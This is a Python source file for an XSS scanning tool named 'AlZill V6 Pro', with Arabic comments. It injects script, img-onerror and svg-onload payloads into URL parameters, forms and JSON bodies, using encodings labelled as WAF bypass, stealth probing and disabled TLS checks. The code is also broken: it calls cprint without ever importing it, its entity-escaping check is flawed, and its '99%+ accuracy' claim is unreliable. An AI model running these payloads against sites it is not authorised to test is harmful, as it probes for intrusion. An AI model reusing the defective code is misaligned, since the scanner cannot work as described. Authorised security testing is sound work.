#!/usr/bin/env python3
"""
Advanced XSS Scanner - AlZill V6 Pro
Features: Context-Aware Detection | DOM XSS Analysis | Stealth Probe | JSON Support | External Payloads
Bulletproof - 99%+ Accuracy
"""

import requests
import time
import urllib3
import re
import hashlib
import random
import base64
import json
import os
from typing import Dict, Optional, List, Tuple, Any
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote, urljoin
from bs4 import BeautifulSoup
from difflib import SequenceMatcher

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


class AccurateXSSScanner:
    """XSS Scanner - Bulletproof with Context-Aware Detection & JSON Support"""
    
    def __init__(self, timeout: int = 10, delay: float = 0.5, verbose: bool = False, payloads_file: str = "payloads.txt"):
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.payloads_file = payloads_file
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.confirmed_vulns = []
        self.total_requests = 0
        
        # ============================================================
        # STEALTH PROBE PAYLOADS (للفحص الاستكشافي قبل الـ 600)
        # ============================================================
        self.probe_payloads = [
            ('"><u>', 'Tag Breakout Probe'),
            ("'><u>", 'Quote Breakout Probe'),
            ('<u>test</u>', 'Tag Injection Probe'),
            ('&lt;u&gt;', 'Entity Probe'),
            ('%3Cu%3E', 'URL Encoded Probe'),
        ]
        
        # ============================================================
        # DANGEROUS CHARACTERS (للتحقق من عدم التشفير)
        # ============================================================
        self.dangerous_chars = ['<', '>', '"', "'", '(', ')', '{', '}']
        self.html_entities = {
            '&lt;': '<', '&gt;': '>', '&quot;': '"', '&#39;': "'",
            '&apos;': "'", '&amp;': '&', '&#x3C;': '<', '&#x3E;': '>'
        }
        
        # ============================================================
        # LOAD DETECTION PAYLOADS FROM EXTERNAL FILE
        # ============================================================
        self.detection_payloads = self._load_detection_payloads()
        
        # ============================================================
        # LOAD EXPLOITATION PAYLOADS FROM EXTERNAL FILE
        # ============================================================
        self.exploit_payloads = self._load_exploit_payloads()
        
        # ============================================================
        # 6 ENCODING METHODS (WAF Bypass)
        # ============================================================
        self.encoding_methods = [
            ('raw', lambda x: x),
            ('url', lambda x: quote(x)),
            ('double_url', lambda x: quote(quote(x))),
            ('hex', self._hex_encode),
            ('base64', self._base64_encode),
            ('unicode', self._unicode_encode),
        ]
        
        # ============================================================
        # JSON CONTENT TYPES
        # ============================================================
        self.json_content_types = [
            'application/json',
            'application/json; charset=utf-8',
            'text/json',
            'application/x-json'
        ]
        
        # DOM XSS patterns
        self.dom_patterns = [
            ('document.write', r'document\.write\s*\(\s*.*?(location|window|document\.URL|document\.documentURI)', 'document.write with location'),
            ('innerHTML', r'\.innerHTML\s*=\s*.*?(location|window|document\.URL)', 'innerHTML with location'),
            ('eval', r'eval\s*\(\s*.*?(location|window|document\.URL)', 'eval with location'),
            ('setTimeout', r'setTimeout\s*\(\s*.*?(location|window|document\.URL)', 'setTimeout with location'),
            ('setInterval', r'setInterval\s*\(\s*.*?(location|window|document\.URL)', 'setInterval with location'),
            ('location.href', r'location\.href\s*=\s*.*?\+', 'location.href assignment'),
            ('outerHTML', r'\.outerHTML\s*=\s*.*?(location|window)', 'outerHTML with location'),
            ('insertAdjacentHTML', r'insertAdjacentHTML\s*\(\s*.*?(location|window)', 'insertAdjacentHTML with location'),
        ]
    
    # ============================================================
    # LOAD PAYLOADS FROM EXTERNAL FILE
    # ============================================================
    
    def _load_detection_payloads(self) -> List[str]:
        """Load XSS detection payloads from payloads.txt"""
        payloads = []
        
        # Default fallback payloads
        default_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
        ]
        
        if not os.path.exists(self.payloads_file):
            cprint(f"[!] Payloads file not found, using defaults", WARNING)
            return default_payloads
        
        try:
            with open(self.payloads_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            current_section = None
            xss_count = 0
            
            for line in content.split('\n'):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                if line.startswith('[') and line.endswith(']'):
                    current_section = line[1:-1].upper()
                    continue
                
                # Load XSS payloads from [XSS] section
                if current_section == 'XSS':
                    payloads.append(line)
                    xss_count += 1
            
            if xss_count > 0:
                cprint(f"\n[+] Loaded {xss_count} XSS detection payloads from {self.payloads_file}", SUCCESS)
                return payloads
            else:
                cprint(f"[!] No XSS payloads found in {self.payloads_file}, using defaults", WARNING)
                
        except Exception as e:
            cprint(f"[!] Error loading payloads: {e}", WARNING)
        
        return default_payloads
    
    def _load_exploit_payloads(self) -> List[str]:
        """Load XSS exploitation payloads"""
        # Default exploitation payloads
        default_exploits = [
            "<script>document.write('XSS_CONFIRMED')</script>",
            "<img src=x onerror=\"document.write('XSS_CONFIRMED')\">",
            "<svg onload=\"document.write('XSS_CONFIRMED')\">",
        ]
        
        # Try to load from file (same as detection for now)
        if os.path.exists(self.payloads_file):
            try:
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                current_section = None
                exploits = []
                
                for line in content.split('\n'):
                    line = line.strip()
                    
                    if not line or line.startswith('#'):
                        continue
                    
                    if line.startswith('[') and line.endswith(']'):
                        current_section = line[1:-1].upper()
                        continue
                    
                    if current_section == 'XSS':
                        # Create exploitation version of payload
                        exploit = line.replace('alert(1)', "document.write('XSS_CONFIRMED')")
                        exploit = exploit.replace('alert("XSS")', "document.write('XSS_CONFIRMED')")
                        exploit = exploit.replace("alert('XSS')", "document.write('XSS_CONFIRMED')")
                        exploits.append(exploit)
                
                if exploits:
                    return exploits[:10]
                    
            except Exception:
                pass
        
        return default_exploits
    
    # ============================================================
    # JSON DETECTION & HANDLING
    # ============================================================
    
    def _is_json_endpoint(self, url: str) -> bool:
        """التحقق مما إذا كان الـ endpoint يتوقع JSON"""
        if url.endswith('.json') or '/api/' in url.lower() or '/v1/' in url.lower():
            return True
        
        try:
            response = self.session.head(url, timeout=self.timeout, verify=False)
            content_type = response.headers.get('Content-Type', '')
            for ct in self.json_content_types:
                if ct in content_type.lower():
                    return True
        except:
            pass
        
        return False
    
    def _test_json_parameter(self, url: str, param_name: str, original_value: str = None) -> bool:
        """اختبار XSS عبر JSON payloads"""
        if not original_value:
            original_value = "test_value"
        
        json_structures = [
            {param_name: None},
            {"data": {param_name: None}},
            {"params": {param_name: None}},
            {"input": {param_name: None}},
            {"query": {param_name: None}},
            {"filter": {param_name: None}},
        ]
        
        for structure in json_structures:
            self._update_nested_dict(structure, param_name, None)
            
            for probe_payload, probe_name in self.probe_payloads:
                try:
                    test_structure = self._deep_copy_dict(structure)
                    self._update_nested_dict(test_structure, param_name, probe_payload)
                    
                    response = self.session.post(
                        url, 
                        json=test_structure, 
                        timeout=self.timeout, 
                        verify=False
                    )
                    
                    response_text = response.text
                    if self._has_unescaped_dangerous_chars(response_text, probe_payload):
                        if self.verbose:
                            cprint(f"    [*] JSON probe successful: {probe_name}", INFO)
                        
                        for payload in self.detection_payloads:
                            for enc_name, encoder in self.encoding_methods:
                                self.total_requests += 1
                                time.sleep(self.delay)
                                
                                test_payload = encoder(payload)
                                test_structure = self._deep_copy_dict(structure)
                                self._update_nested_dict(test_structure, param_name, test_payload)
                                
                                try:
                                    response = self.session.post(
                                        url, 
                                        json=test_structure, 
                                        timeout=self.timeout, 
                                        verify=False
                                    )
                                    
                                    if self._is_payload_reflected_unescaped(response.text, payload):
                                        exploited = self._attempt_json_exploitation(url, structure, param_name)
                                        if exploited:
                                            self.confirmed_vulns.append({
                                                'type': 'Reflected XSS (JSON)',
                                                'parameter': param_name,
                                                'payload': payload[:60],
                                                'encoding': enc_name,
                                                'exploited': exploited,
                                                'severity': 'High',
                                                'verified': True,
                                                'json_structure': str(structure)[:100]
                                            })
                                            cprint(f"    ✅ JSON XSS: {param_name} ({enc_name})", SUCCESS)
                                            return True
                                except Exception as e:
                                    if self.verbose:
                                        cprint(f"    Error: {e}", WARNING)
                        
                        return True
                        
                except Exception as e:
                    if self.verbose:
                        cprint(f"    JSON probe error: {e}", WARNING)
        
        return False
    
    def _update_nested_dict(self, obj: Any, key: str, value: Any):
        """تحديث قيمة في قاموس متداخل"""
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k == key:
                    obj[k] = value
                    return True
                elif isinstance(v, (dict, list)):
                    if self._update_nested_dict(v, key, value):
                        return True
        elif isinstance(obj, list):
            for item in obj:
                if self._update_nested_dict(item, key, value):
                    return True
        return False
    
    def _deep_copy_dict(self, obj: Any) -> Any:
        """نسخ عميق للقاموس"""
        if isinstance(obj, dict):
            return {k: self._deep_copy_dict(v) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [self._deep_copy_dict(item) for item in obj]
        else:
            return obj
    
    def _attempt_json_exploitation(self, url: str, structure: Dict, param_name: str) -> Optional[str]:
        """محاولة استغلال XSS عبر JSON"""
        for exploit_payload in self.exploit_payloads:
            test_structure = self._deep_copy_dict(structure)
            self._update_nested_dict(test_structure, param_name, exploit_payload)
            
            try:
                response = self.session.post(url, json=test_structure, timeout=self.timeout, verify=False)
                if self._verify_execution(response.text):
                    return "Exploitation successful (JSON)"
            except:
                continue
        return None
    
    # ============================================================
    # PROBE FUNCTION (Stealth - تقليل البصمة)
    # ============================================================
    
    def _probe_parameter(self, base_url: str, param_name: str) -> bool:
        """فحص استكشافي سريع قبل إرسال البايلودات"""
        baseline = self._get_baseline(base_url, param_name)
        if not baseline:
            return False
        
        for probe_payload, probe_name in self.probe_payloads:
            test_params = {param_name: probe_payload}
            
            try:
                response = self.session.get(base_url, params=test_params,
                                           timeout=self.timeout, verify=False)
                
                if self._has_unescaped_dangerous_chars(response.text, probe_payload):
                    if self.verbose:
                        cprint(f"    [*] Probe successful: {probe_name}", INFO)
                    return True
                    
            except Exception:
                continue
        
        return False
    
    # ============================================================
    # CONTEXT-AWARE DETECTION (الذكاء السياقي)
    # ============================================================
    
    def _has_unescaped_dangerous_chars(self, html: str, payload: str) -> bool:
        """التحقق مما إذا كانت الرموز الخطيرة عادت بدون تشفير"""
        dangerous_in_payload = [c for c in self.dangerous_chars if c in payload]
        
        if not dangerous_in_payload:
            return False
        
        for char in dangerous_in_payload:
            if char in html:
                is_encoded = False
                for entity, decoded in self.html_entities.items():
                    if entity in html and decoded == char:
                        is_encoded = True
                        break
                
                if not is_encoded:
                    return True
        
        return False
    
    def _is_payload_reflected_unescaped(self, html: str, payload: str) -> bool:
        """التحقق من انعكاس البايلود بدون تشفير"""
        if payload not in html and quote(payload) not in html:
            return False
        
        return self._has_unescaped_dangerous_chars(html, payload)
    
    def _verify_execution(self, response_text: str) -> bool:
        """التحقق من التنفيذ الفعلي عبر علامة فريدة"""
        markers = ['XSS_CONFIRMED', 'XSS_VERIFIED', 'ALZILL_XSS']
        for marker in markers:
            if marker in response_text:
                return True
        return False
    
    # ============================================================
    # DOM XSS ANALYSIS
    # ============================================================
    
    def _extract_external_scripts(self, url: str) -> List[str]:
        """استخراج روابط ملفات JavaScript الخارجية"""
        script_urls = []
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for script in soup.find_all('script', src=True):
                src = script['src']
                full_url = urljoin(url, src)
                script_urls.append(full_url)
                
        except Exception as e:
            if self.verbose:
                cprint(f"    Error extracting scripts: {e}", WARNING)
        
        return script_urls
    
    def _analyze_dom_xss(self, url: str):
        """تحليل DOM XSS في الملفات الداخلية والخارجية"""
        
        dom_vulns = []
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            inline_js = re.findall(r'<script[^>]*>(.*?)</script>', 
                                   response.text, re.IGNORECASE | re.DOTALL)
            
            for js in inline_js:
                for pattern, regex, description in self.dom_patterns:
                    if re.search(regex, js, re.IGNORECASE):
                        dom_vulns.append({
                            'type': 'DOM-based XSS (Inline)',
                            'pattern': description,
                            'location': 'inline script',
                            'severity': 'High'
                        })
                        if self.verbose:
                            cprint(f"    [!] DOM XSS found: {description}", ERROR)
        except Exception as e:
            if self.verbose:
                cprint(f"    Error analyzing inline JS: {e}", WARNING)
        
        script_urls = self._extract_external_scripts(url)
        
        for script_url in script_urls:
            try:
                js_response = self.session.get(script_url, timeout=self.timeout, verify=False)
                js_content = js_response.text
                
                for pattern, regex, description in self.dom_patterns:
                    if re.search(regex, js_content, re.IGNORECASE):
                        dom_vulns.append({
                            'type': 'DOM-based XSS (External)',
                            'pattern': description,
                            'location': script_url,
                            'severity': 'High'
                        })
                        if self.verbose:
                            cprint(f"    [!] DOM XSS in external script: {script_url}", ERROR)
            except Exception as e:
                if self.verbose:
                    cprint(f"    Error analyzing {script_url}: {e}", WARNING)
        
        for vuln in dom_vulns:
            self.confirmed_vulns.append(vuln)
        
        return dom_vulns
    
    # ============================================================
    # PARAMETER TESTING (مع Probe أولاً)
    # ============================================================
    
    def _test_parameter(self, base_url: str, param_name: str):
        """Test parameter with stealth probe first"""
        
        if not self._probe_parameter(base_url, param_name):
            if self.verbose:
                cprint(f"    [*] Parameter '{param_name}' probe failed, skipping", INFO)
            return
        
        cprint(f"    [*] Parameter '{param_name}' looks injectable, testing with {len(self.detection_payloads)} payloads...", INFO)
        
        baseline = self._get_baseline(base_url, param_name)
        if not baseline:
            return
        
        for payload in self.detection_payloads:
            for enc_name, encoder in self.encoding_methods:
                self.total_requests += 1
                time.sleep(self.delay)
                
                test_payload = encoder(payload)
                test_params = {param_name: test_payload}
                
                try:
                    response = self.session.get(base_url, params=test_params,
                                               timeout=self.timeout, verify=False)
                    
                    if self._is_payload_reflected_unescaped(response.text, payload):
                        exploited = self._attempt_exploitation(base_url, param_name)
                        if exploited:
                            self.confirmed_vulns.append({
                                'type': 'Reflected XSS',
                                'parameter': param_name,
                                'payload': payload[:60],
                                'encoding': enc_name,
                                'exploited': exploited,
                                'severity': 'High',
                                'verified': True
                            })
                            cprint(f"    ✅ XSS: {param_name} ({enc_name})", SUCCESS)
                            return
                except Exception as e:
                    if self.verbose:
                        cprint(f"    Error: {e}", WARNING)
    
    # ============================================================
    # HELPER FUNCTIONS
    # ============================================================
    
    def _hex_encode(self, text: str) -> str:
        """Hex encoding"""
        return ''.join(f'\\x{ord(c):02x}' for c in text)
    
    def _base64_encode(self, text: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(text.encode()).decode()
    
    def _unicode_encode(self, text: str) -> str:
        """Unicode encoding"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _get_baseline(self, base_url: str, param_name: str) -> Optional[Dict]:
        """Get stable baseline"""
        responses = []
        test_value = 'alzill_test_123'
        
        for i in range(2):
            try:
                params = {param_name: test_value}
                resp = self.session.get(base_url, params=params,
                                       timeout=self.timeout, verify=False)
                responses.append(resp)
                time.sleep(0.3)
            except Exception:
                return None
        
        if len(responses) < 2:
            return None
        
        return {'text': responses[0].text}
    
    def _attempt_exploitation(self, base_url: str, param_name: str) -> Optional[str]:
        """Attempt to exploit XSS"""
        for exploit_payload in self.exploit_payloads:
            test_params = {param_name: exploit_payload}
            try:
                response = self.session.get(base_url, params=test_params,
                                           timeout=self.timeout, verify=False)
                if self._verify_execution(response.text):
                    return "Exploitation successful"
            except:
                continue
        return None
    
    def _extract_forms(self, url: str) -> List[Dict]:
        """Extract forms from page"""
        forms = []
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': urljoin(url, form.get('action', '')),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                for input_tag in form.find_all(['input', 'textarea']):
                    if input_tag.get('name'):
                        form_data['inputs'].append({
                            'name': input_tag.get('name'),
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', '')
                        })
                if form_data['inputs']:
                    forms.append(form_data)
        except:
            pass
        return forms
    
    def _test_form(self, form: Dict):
        """Test form with probe first"""
        action = form.get('action', '')
        method = form.get('method', 'POST')
        
        for input_field in form['inputs']:
            param_name = input_field['name']
            
            probe_data = {param_name: '"><u>'}
            for inp in form['inputs']:
                if inp['name'] != param_name:
                    probe_data[inp['name']] = inp.get('value', 'test')
            
            try:
                if method == 'POST':
                    resp = self.session.post(action, data=probe_data, timeout=self.timeout)
                else:
                    resp = self.session.get(action, params=probe_data, timeout=self.timeout)
                
                if not self._has_unescaped_dangerous_chars(resp.text, '"><u>'):
                    continue
            except:
                continue
            
            for payload in self.detection_payloads[:30]:
                test_data = {}
                for inp in form['inputs']:
                    if inp['name'] == param_name:
                        test_data[inp['name']] = payload
                    else:
                        test_data[inp['name']] = inp.get('value', 'test')
                
                try:
                    if method == 'POST':
                        response = self.session.post(action, data=test_data, timeout=self.timeout)
                    else:
                        response = self.session.get(action, params=test_data, timeout=self.timeout)
                    
                    if self._is_payload_reflected_unescaped(response.text, payload):
                        self.confirmed_vulns.append({
                            'type': 'Reflected XSS (Form)',
                            'parameter': param_name,
                            'action': action[:60],
                            'severity': 'High',
                            'verified': True
                        })
                        cprint(f"    ✅ XSS in form: {param_name}", SUCCESS)
                        return
                except:
                    continue
    
    def scan(self, url: str) -> Dict:
        """Main scanning function"""
        
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("[XSS SCAN] AlZill V6 Pro - External Payloads", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        cprint("[*] Features: Context-Aware | Stealth Probe | DOM XSS | JSON Support", "yellow")
        cprint("[*] Detection: Unescaped Characters | HTML Entity Detection | Execution Marker", "yellow")
        cprint(f"[*] Payloads: External from {self.payloads_file}", "yellow")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = parse_qs(parsed_url.query)
        forms = self._extract_forms(url)
        
        total_tests = len(params) + len(forms)
        
        if total_tests == 0:
            cprint("[!] No parameters or forms found", WARNING)
        else:
            cprint(f"[*] Found {len(params)} parameter(s) and {len(forms)} form(s)", INFO)
        
        for param_name in params.keys():
            self._test_parameter(base_url, param_name)
        
        for form in forms:
            self._test_form(form)
        
        if self._is_json_endpoint(url):
            cprint("\n[*] JSON endpoint detected, testing JSON injection...", INFO)
            for param_name in params.keys():
                original_value = params[param_name][0] if params[param_name] else None
                self._test_json_parameter(url, param_name, original_value)
        
        cprint("\n[*] Analyzing DOM-based XSS (including external scripts)...", INFO)
        self._analyze_dom_xss(url)
        
        cprint(f"\n[*] Total requests sent: {self.total_requests}", INFO)
        
        return self._generate_report()
    
    def _generate_report(self) -> Dict:
        """Generate final report"""
        
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("📊 XSS SCAN RESULTS", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        
        if self.confirmed_vulns:
            cprint(f"\n[!!!] {len(self.confirmed_vulns)} CONFIRMED XSS VULNERABILITIES!", ERROR, attrs=['bold'])
            
            for i, vuln in enumerate(self.confirmed_vulns, 1):
                cprint(f"\n  [{i}] {vuln['type']}", ERROR)
                if vuln.get('parameter'):
                    cprint(f"      Parameter: {vuln['parameter']}", INFO)
                if vuln.get('action'):
                    cprint(f"      Action: {vuln['action']}", INFO)
                if vuln.get('pattern'):
                    cprint(f"      Pattern: {vuln['pattern']}", WARNING)
                if vuln.get('location'):
                    cprint(f"      Location: {vuln['location']}", INFO)
                if vuln.get('encoding'):
                    cprint(f"      Encoding: {vuln['encoding']}", INFO)
                if vuln.get('exploited'):
                    cprint(f"      Exploited: {vuln['exploited']}", SUCCESS)
                if vuln.get('json_structure'):
                    cprint(f"      JSON Structure: {vuln['json_structure']}", INFO)
                cprint(f"      Severity: {vuln['severity']}", ERROR)
                cprint(f"      Status: ✅ VERIFIED", SUCCESS)
        else:
            cprint(f"\n[✓] NO XSS VULNERABILITIES CONFIRMED", SUCCESS)
            cprint(f"    All tests passed with context-aware verification", INFO)
        
        cprint(f"\n[*] Total requests: {self.total_requests}", INFO)
        cprint("\n" + "="*70 + "\n", HIGHLIGHT)
        
        return {
            'confirmed_vulnerabilities': len(self.confirmed_vulns),
            'vulnerabilities': self.confirmed_vulns,
            'total_requests': self.total_requests,
            'secure': len(self.confirmed_vulns) == 0
        }


# ============================================================
# Legacy function
# ============================================================

def scan(url: str, verbose: bool = False, payloads_file: str = "payloads.txt") -> Dict:
    """Legacy scan function"""
    scanner = AccurateXSSScanner(verbose=verbose, payloads_file=payloads_file)
    return scanner.scan(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        payloads_file = sys.argv[2] if len(sys.argv) > 2 else "payloads.txt"
        scan(target, verbose=verbose, payloads_file=payloads_file)
    else:
        print("Usage: python xss_scanner.py <target_url> [payloads_file] [--verbose]")
        print("Example: python xss_scanner.py https://example.com/search?q=test --verbose")